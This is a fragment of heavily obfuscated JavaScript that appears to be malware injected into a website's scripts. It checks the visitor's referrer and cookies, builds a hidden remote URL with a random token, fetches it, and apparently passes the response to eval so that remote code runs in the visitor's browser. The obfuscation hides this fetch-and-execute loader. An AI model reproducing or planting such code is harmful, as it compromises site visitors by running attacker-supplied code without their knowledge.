Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};